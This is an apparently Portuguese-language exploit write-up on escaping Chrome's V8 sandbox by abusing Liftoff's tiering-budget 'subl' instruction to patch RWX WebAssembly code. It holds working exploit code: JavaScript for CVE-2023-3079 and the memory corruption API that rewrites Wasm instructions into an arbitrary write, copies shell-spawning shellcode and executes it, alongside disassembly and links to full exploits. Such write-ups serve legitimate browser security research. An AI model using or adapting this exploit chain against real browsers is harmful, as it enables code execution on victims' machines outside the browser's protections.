# Abusing Liftoff assembly and efficiently escaping from sbx

> 2023-12-12

O Chrome vem criando novas mitigações a fim de inviabilizar, ou pelo menos dificultar, a exploração do v8, pois a complexidade de implementar a especificação mais moderna do ECMAScript e manter uma performance de alto nível são uma tarefa muito complexa e uma enorme superfície de ataque. Tendo isso em mente, o projeto “[V8 Sandbox](https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit)” foi desenvolvido.

Essa sandbox é um pouco diferente do convencional. Não existem dois processos distintos ou uma limitante de poderes para o v8, o design da sandbox é baseado no isolamento da Heap e no poder de corrupção. Basicamente, o v8 aloca uma região de memória, a chamada “V8 Sandbox”, e nela coloca todos os JSObjects. Ou seja, todos os objetos em si do JS. O ponto crucial é remover todos os ponteiros raw de 64 bits de dentro da Sandbox e trocar por offsets (de 32 a 40 bits) ou índices de tabelas estrangeiras(de fora da heap). Dessa forma, ao adquirir algum bug, fica-se limitado para corromper dados de dentro da Sandbox e não resultaria em nada mais que um crash.

![v8-sandbox.png](/assets/imgs/abusing-liftoff-assembly/v8-sandbox.png)

Podemos ver que para acessar um `ArrayBuffer`, utilizamos um offset de 40 bits, então, caso se possa corromper tal endereço, não será possível escapar da Sandbox para escrever na página Wasm RWX, por exemplo. Da mesma forma, para acessar entidades externas, como a DOM, será usado um índice (0, 1, 2, 3…) e o mesmo ocorrerá com os `Code Pointers`. Como não temos nem o offset do ponteiro da função, também inválida a possibilidade de executar o código com `JIT spray` - uma técnica na qual utilizamos o JIT para criar instruções específicas de `mov`, e depois desalinhar o ponteiro de entry point, a fim de conseguir executar um shellcode.

- Olhando para este grande gráfico, ele parece bastante intimidante.

## **Liftoff**

O **Liftoff** é o compilador de WebAssembly do v8, sendo o seu objetivo o de criar o assembly relativo de um código Wasm o mais rápido possível. Para o caso de ser necessário posteriormente, o código será otimizado pelo TurboFan. O interessante aqui são alguns opcodes gerados pelo Liftoff, podemos usar o seguinte código em Wasm e ver o resultado compilado:

```wasm
;; Literally do nothing
(module
  (func (export "nop")
    nop
  )
)
```

```nasm
// ./d8 --print-code --allow-natives-syntax --shell exp.js
V8 version 12.1.0 (candidate)
d8> nop()
--- WebAssembly code ---
name: wasm-function[0]
index: 0
kind: wasm function
compiler: Liftoff
Body (size = 128 = 80 + 48 padding)
Instructions (size = 68)
0x3b34546a5c00     0  55                   push rbp
0x3b34546a5c01     1  4889e5               REX.W movq rbp,rsp
0x3b34546a5c04     4  6a08                 push 0x8
0x3b34546a5c06     6  56                   push rsi
0x3b34546a5c07     7  4881ec10000000       REX.W subq rsp,0x10
0x3b34546a5c0e     e  493b65a0             REX.W cmpq rsp,[r13-0x60]
0x3b34546a5c12    12  0f8613000000         jna 0x3b34546a5c2b  <+0x2b>
0x3b34546a5c18    18  4c8b5677             REX.W movq r10,[rsi+0x77]
0x3b34546a5c1c    1c  41832a18             subl [r10],0x18
0x3b34546a5c20    20  0f8810000000         js 0x3b34546a5c36  <+0x36>
0x3b34546a5c26    26  488be5               REX.W movq rsp,rbp
0x3b34546a5c29    29  5d                   pop rbp
0x3b34546a5c2a    2a  c3                   retl
0x3b34546a5c2b    2b  e8d0f6ffff           call 0x3b34546a5300  (jump table)
0x3b34546a5c30    30  488b75f0             REX.W movq rsi,[rbp-0x10]
0x3b34546a5c34    34  ebe2                 jmp 0x3b34546a5c18  <+0x18>
0x3b34546a5c36    36  e825f5ffff           call 0x3b34546a5160  (jump table)
0x3b34546a5c3b    3b  488b75f0             REX.W movq rsi,[rbp-0x10]
0x3b34546a5c3f    3f  ebe5                 jmp 0x3b34546a5c26  <+0x26>
0x3b34546a5c41    41  0f1f00               nop

Source positions:
 pc offset  position
        2b         0  statement
        36         2  statement

Safepoints (entries = 1, byte size = 10)
0x3b34546a5c30     30  slots (sp->fp): 00000000

RelocInfo (size = 0)

--- End code ---
```

Perto do meio da função podemos ver duas instruções muito peculiares:

```nasm
;; [1]
mov r10, [rsi+0x77]
subl [r10], 0x18
```

Se usarmos um *debugger* podemos ver que `rsi` é um ponteiro para a `WasmInstance`, Objeto que reside dentro da V8 Sandbox:

![debug-print.png](/assets/imgs/abusing-liftoff-assembly/debug-print.png)

Hmm, interessante. Vamos usar outro código para ver outra situação:

```wasm
;; Get 2 params, 32bits offset and 64bits to write
(module
  (memory 1)

  (func (export "write")
    (param $offset i32)  ;; Offset within memory
    (param $value i64)   ;; 64-bit integer to write
    (i64.store
      (local.get $offset)  ;; Get the memory offset
      (local.get $value)   ;; Get the i64 value
    )
  )
)
```

```nasm
// ./d8 --print-code --allow-natives-syntax --shell exp.js
V8 version 12.1.0 (candidate)
d8> write(0, 10n)
--- WebAssembly code ---
name: wasm-function[1]
index: 1
kind: wasm function
compiler: Liftoff
Body (size = 128 = 104 + 24 padding)
Instructions (size = 92)
0x2376a15e0b80     0  55                   push rbp
0x2376a15e0b81     1  4889e5               REX.W movq rbp,rsp
0x2376a15e0b84     4  6a08                 push 0x8
0x2376a15e0b86     6  56                   push rsi
0x2376a15e0b87     7  4881ec10000000       REX.W subq rsp,0x10
0x2376a15e0b8e     e  493b65a0             REX.W cmpq rsp,[r13-0x60]
0x2376a15e0b92    12  0f8623000000         jna 0x2376a15e0bbb  <+0x3b>
0x2376a15e0b98    18  488b4e27             REX.W movq rcx,[rsi+0x27]
0x2376a15e0b9c    1c  48c1e918             REX.W shrq rcx, 24
;;                    ^ opcode do shr
0x2376a15e0ba0    20  4903ce               REX.W addq rcx,r14
0x2376a15e0ba3    23  48891401             REX.W movq [rcx+rax*1],rdx
0x2376a15e0ba7    27  4c8b5677             REX.W movq r10,[rsi+0x77]
0x2376a15e0bab    2b  41836a0427           subl [r10+0x4],0x27
0x2376a15e0bb0    30  0f8814000000         js 0x2376a15e0bca  <+0x4a>
0x2376a15e0bb6    36  488be5               REX.W movq rsp,rbp
0x2376a15e0bb9    39  5d                   pop rbp
0x2376a15e0bba    3a  c3                   retl
0x2376a15e0bbb    3b  50                   push rax
0x2376a15e0bbc    3c  52                   push rdx
0x2376a15e0bbd    3d  e83ef7ffff           call 0x2376a15e0300  (jump table)
0x2376a15e0bc2    42  5a                   pop rdx
0x2376a15e0bc3    43  58                   pop rax
0x2376a15e0bc4    44  488b75f0             REX.W movq rsi,[rbp-0x10]
0x2376a15e0bc8    48  ebce                 jmp 0x2376a15e0b98  <+0x18>
0x2376a15e0bca    4a  50                   push rax
0x2376a15e0bcb    4b  51                   push rcx
0x2376a15e0bcc    4c  52                   push rdx
0x2376a15e0bcd    4d  e88ef5ffff           call 0x2376a15e0160  (jump table)
0x2376a15e0bd2    52  5a                   pop rdx
0x2376a15e0bd3    53  59                   pop rcx
0x2376a15e0bd4    54  58                   pop rax
0x2376a15e0bd5    55  488b75f0             REX.W movq rsi,[rbp-0x10]
0x2376a15e0bd9    59  ebdb                 jmp 0x2376a15e0bb6  <+0x36>
0x2376a15e0bdb    5b  90                   nop

Protected instructions:
 pc offset
        23         

Source positions:
 pc offset  position
        23         5  statement
        3d         0  statement
        4d         8  statement

Safepoints (entries = 1, byte size = 11)
0x2376a15e0ba3     23  slots (sp->fp): 0000000000000000

RelocInfo (size = 0)

--- End code ---
```

Perto do meio da função, podemos ver as seguintes instruções:

```nasm
;; [2]
mov rcx, [rsi+0x27] ;; address from v8 cage
shr rcx, 24         ;; shift to limit address size
add rcx, r14        ;; add base with sandbox offset
mov [rcx+rax], rdx  ;; write we 64bit(rdx) to base(rcx) + input offset(rax)
```

Podemos analisar no compilador o código responsável por gerar esses trechos de códigos e vamos perceber exatamente qual a diferença desses dois acessos à memória:

```cpp
// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/baseline/x64/liftoff-assembler-x64-inl.h;l=323-340;drc=c2783fca4a60fb1ca2cd3b05bc7676396905f8f9
void LiftoffAssembler::CheckTierUp(int declared_func_index, int budget_used,
                                   Label* ool_label,
                                   const FreezeCacheState& frozen) {
  Register instance = cache_state_.cached_instance;
  if (instance == no_reg) {
    instance = kScratchRegister;
    LoadInstanceFromFrame(instance);
  }

  Register budget_array = kScratchRegister;  // Overwriting {instance}.
  constexpr int kArrayOffset = wasm::ObjectAccess::ToTagged(
      WasmInstanceObject::kTieringBudgetArrayOffset);
  movq(budget_array, Operand{instance, kArrayOffset});

  // [3]
  int offset = kInt32Size * declared_func_index;
  subl(Operand{budget_array, offset}, Immediate(budget_used));
  j(negative, ool_label);
}
```

```cpp
// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/codegen/x64/macro-assembler-x64.cc;l=449-457;drc=8de6dcc377690a0ea0fd95ba6bbef802f55da683
void MacroAssembler::DecodeSandboxedPointer(Register value) {
  ASM_CODE_COMMENT(this);
#ifdef V8_ENABLE_SANDBOX
// [4]
  shrq(value, Immediate(kSandboxedPointerShift));
  addq(value, kPtrComprCageBaseRegister);
#else
  UNREACHABLE();
#endif
}
```

No primeiro acesso (`[1]`), quem gerou esse assembly foi a função `CheckTierUp` (`[3]`), que pega esse endereço com `Operand{instance, kArrayOffset}`, que é compilado para `mov r10, [instance+kArrayOffset]`, enquanto no segundo trecho de código (`[2]`), quem gerou esse acesso foi a função `DecodeSandboxedPointer`, fazendo o *shift* e *add* corretos (`[4]`). Ou seja, estamos simplesmente confiando em um ponteiro de dentro da sandbox e subtraindo `budget_used`.

Se você se lembrar que as paginas de WebAssembly são RWX você pode perceber algo interessante: Temos um CTF de shellcoding!

Se escrevemos no endereço `[rsi+0x77]` o endereço da instrução `shr rcx, 24`, podemos subtrair 0x18 de algum lugar do opcode, vamos ver quais instruções podemos criar com isso:

```bash
r3tr0@pwn:~$ rasm2 -d 48c1e918
shr rcx, 0x18
r3tr0@pwn:~$ rasm2 -d 30c1e918 # 0x48-0x18=0x30
xor cl, al
invalid
invalid
r3tr0@pwn:~$ rasm2 -d 48a9e918 # 0xc1-0x18=0xa9
invalid
invalid
invalid
invalid
r3tr0@pwn:~$ rasm2 -d 48c1d118 # 0xe9-0x18=0xd1
rcl rcx, 0x18
```

Ótimo! Achamos algo muito útil! Conseguimos trocar a instrução `shr rcx, 0x18` por `rcl rcx, 0x18`, essa instrução apenas faz “Rotate” do valor. Isso parece o suficiente para ignorar o shift e utilizar endereços de 64 bits, dessa forma, podemos simplesmente usar essa função como “write any where” e copiar um shellcode para alguma função Wasm.

# Exploits

Vamos testar nossa teoria! Podemos fazer de duas formas, usar algum CVE recente ou as API's de corrupção de memória (é estranho que isso exista, mas a sua função é exatamente testar coisas como a sandbox), podemos ativar ela com a flag `v8_expose_memory_corruption_api=true` no arquivo `args.gn`. Nesse paper vamos testar as duas formas.

## CVE-2023-3079

> Exploit baseado em: [https://github.com/mistymntncop/CVE-2023-3079](https://github.com/mistymntncop/CVE-2023-3079)

Essa é uma falha onde vazamos o **TheHole** e forçamos um *type confusion*, não irei me aprofundar, pois não é o objetivo deste paper, mas se quiser ver de forma mais detalhada sobre o bug, leia o exploit original [aqui](https://github.com/mistymntncop/CVE-2023-3079/blob/main/exploit.js).

Vamos repetir o mesmo processo e ver o código gerado:

```wasm
(module
  (func $nop (export "nop")
    nop
  )
)
```

```nasm
--- WebAssembly code ---
name: wasm-function[0]
index: 0
kind: wasm function
compiler: Liftoff
Body (size = 128 = 88 + 40 padding)
Instructions (size = 76)
0x1c6675a9740     0  55                   push rbp
0x1c6675a9741     1  4889e5               REX.W movq rbp,rsp
0x1c6675a9744     4  6a08                 push 0x8
0x1c6675a9746     6  56                   push rsi
0x1c6675a9747     7  4881ec10000000       REX.W subq rsp,0x10
0x1c6675a974e     e  488b462f             REX.W movq rax,[rsi+0x2f]
0x1c6675a9752    12  483b20               REX.W cmpq rsp,[rax]
0x1c6675a9755    15  0f8619000000         jna 0x1c6675a9774  <+0x34>
0x1c6675a975b    1b  488b868f000000       REX.W movq rax,[rsi+0x8f]
0x1c6675a9762    22  8b08                 movl rcx,[rax]
0x1c6675a9764    24  83e91b               subl rcx,0x1b
0x1c6675a9767    27  0f8812000000         js 0x1c6675a977f  <+0x3f>
0x1c6675a976d    2d  8908                 movl [rax],rcx
0x1c6675a976f    2f  488be5               REX.W movq rsp,rbp
0x1c6675a9772    32  5d                   pop rbp
0x1c6675a9773    33  c3                   retl
0x1c6675a9774    34  e867fbffff           call 0x1c6675a92e0  (jump table)
0x1c6675a9779    39  488b75f0             REX.W movq rsi,[rbp-0x10]
0x1c6675a977d    3d  ebdc                 jmp 0x1c6675a975b  <+0x1b>
0x1c6675a977f    3f  e8dcf9ffff           call 0x1c6675a9160  (jump table)
0x1c6675a9784    44  488b75f0             REX.W movq rsi,[rbp-0x10]
0x1c6675a9788    48  ebe5                 jmp 0x1c6675a976f  <+0x2f>
0x1c6675a978a    4a  6690                 nop

Source positions:
 pc offset  position
        34         0  statement
        3f         2  statement

Safepoints (entries = 1, byte size = 10)
0x1c6675a9779     39  slots (sp->fp): 00000000

RelocInfo (size = 0)

--- End code ---
```

Durante os testes eu não consegui achar uma forma de usar o valor `0x1b` para criar outros opcodes uteis, então tive uma outra ideia, o valor do `subl` muda dependendo da versão do v8 e das interações que o código tem com a *stack*. O objetivo será gerar duas funcões de "nop", uma com o `budget_used` maior que o outro, e usar a primeira função para subtrair da segunda o valor do seu `subl`, exemplificando melhor:

```wasm
(module
  (memory 1)
  (func $nop (export "nop")
    i32.const 1
    i32.const 0xdead
    i32.store
  )

  (func (export "nop2")
    nop
    i32.const 0
    i32.const 0xdead
    i32.store
    i32.const 1
    i32.const 0xdead
    i32.store
  )
)
```

```javascript
V8 version 11.4.0 (candidate)
d8> nop()
[truncated]
0x1a787102975b    1b  488b868f000000       REX.W movq rax,[rsi+0x8f]
0x1a7871029762    22  8b08                 movl rcx,[rax]
0x1a7871029764    24  83e91b               subl rcx,0x1b
[truncated]
d8> nop2()
[truncated]
0x1a78710297f5    35  488b868f000000       REX.W movq rax,[rsi+0x8f]
0x1a78710297fc    3c  8b5008               movl rdx,[rax+0x8]
0x1a78710297ff    3f  83ea35               subl rdx,0x35
[truncated]
```

E no exploit vamos subtrair `0x1b` de `0x35`:

```javascript
v8_write64(wasm_instance_addr + tiering_budget_array_off, sub_instruction_addr);
nop(); // transform "subl rdx,0x35" in "subl rdi,0x7"
```

E depois disso, podemos subtrair valores de forma mais assertiva, vamos criar outras duas funções no WebAssembly, `arb_write` e `shell`, a primeira será a função que vamos retirar os checks de integridade e a segunda um "nop" para onde vamos copiar nosso shellcode:

```wasm
(func $main (export "arb_write")
  (param $offset i32)  ;; Offset within memory
  (param $value i64)   ;; 64-bit integer to write
  
  (i64.store
    (local.get $offset)  ;; Get the memory offset
    (local.get $value)   ;; Get the i64 value
  )
)
(func (export "shell")
  nop
)
```

Agora com nosso `subl [arb address],0x7` vamos trocar algumas instruções de `arb_write`:

```javascript
v8_write64(wasm_instance_addr + tiering_budget_array_off, shr_instruction_addr - 4n);
nop2(); // transform "shrq rcx, 24" in "shr r9d, 0x18"

v8_write64(wasm_instance_addr + tiering_budget_array_off, add_instruction_addr - 4n);
nop2(); // transform "addq rcx,r14" in "add ecx, esi"
v8_write64(wasm_instance_addr + tiering_budget_array_off, add_instruction_addr - 4n + 2n);
nop2(); // transform "add ecx, esi" in "add eax,edi"
v8_write64(wasm_instance_addr + tiering_budget_array_off, add_instruction_addr - 4n + 2n);
nop2(); // transform "add eax,edi" in "add eax, eax"

v8_write64(wasm_instance_addr + tiering_budget_array_off, orig_sub_addr);
```

Trocamos as instruções `shrq rcx, 24` por `shr r9d, 0x18` e `addq rcx, r14` por `add eax, eax`, uma comparação de antes/depois:

```nasm
V8 version 11.4.0 (candidate)
d8> arb_write(0, 10n)      
[truncated]
0x1d26426fd81b    1b  488b4e1f             REX.W movq rcx,[rsi+0x1f]
0x1d26426fd81f    1f  48c1e918             REX.W shrq rcx, 24
0x1d26426fd823    23  4903ce               REX.W addq rcx,r14
0x1d26426fd826    26  48891401             REX.W movq [rcx+rax*1],rdx
0x1d26426fd82a    2a  488b9e8f000000       REX.W movq rbx,[rsi+0x8f]
0x1d26426fd831    31  8b7b08               movl rdi,[rbx+0x8]
0x1d26426fd834    34  83ef2a               subl rdi,0x2a
[truncated]
```

```nasm
pwndbg> x/10i 0x1d26426fd81b
   0x1d26426fd81b:	mov    rcx,QWORD PTR [rsi+0x1f]
   0x1d26426fd81f:	shr    r9d,0x18
   0x1d26426fd823:	rex.X  add eax,eax
   0x1d26426fd826:	mov    QWORD PTR [rcx+rax*1],rdx
   0x1d26426fd82a:	mov    rbx,QWORD PTR [rsi+0x8f]
   0x1d26426fd831:	mov    edi,DWORD PTR [rbx+0x8]
   0x1d26426fd834:	sub    edi,0x2a
[truncated]
```

Perfeito! Finalmente podemos simplesmente copiar nosso shellcode e executar shell:

```javascript
const shellcode = [
  0x732f6e69622fb848n, 0x66525f5450990068n, 0x5e8525e54632d68n, 0x68736162000000n, 0xf583b6a5e545756n, 0x5n
];

console.log("[+] Copying shellcode")
v8_write64(wasm_instance_addr + 0x1fn, shellcode_addr);
shellcode.map((code, i) => {
  arb_write(i * 4, code);
})

console.log("[+] Poping shell!!!")
shell();
```

![poping-shell-cve-2023-3079.png](/assets/imgs/abusing-liftoff-assembly/poping-shell-cve-2023-3079.png)

[Final exploit](https://github.com/R3tr074/exploits/blob/master/browser/v8/cve-2023-3079/exploit.js)

## Memory corruption API

Para adaptar o exploit usando a memory corruption API não é muito complexo, podemos criar as seguintes funções para simular uma exploração bem sucedida dentro da v8 sandbox:

```javascript
let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
  return Sandbox.getAddressOf(obj);
}

function v8_read64(addr) {
  return sandboxMemory.getBigUint64(Number(addr), true);
}

function v8_write64(addr, val) {
  return sandboxMemory.setBigInt64(Number(addr), val, true);
}
```

E para escrever o exploit, precisamos apenas *debuggar* um pouco para encontrar os novos offsets e valores que precisamos/podemos corromper:

![poping-shell-memory-corruption-api.png](/assets/imgs/abusing-liftoff-assembly/poping-shell-memory-corruption-api.png)

[Final exploit](https://github.com/R3tr074/exploits/blob/master/browser/v8/v8-sandbox-escape/exploit.js)

---

Se você tiver qualquer duvida sobre o paper, fique a vontade para entrar em [contato](https://twitter.com/r3tr074).
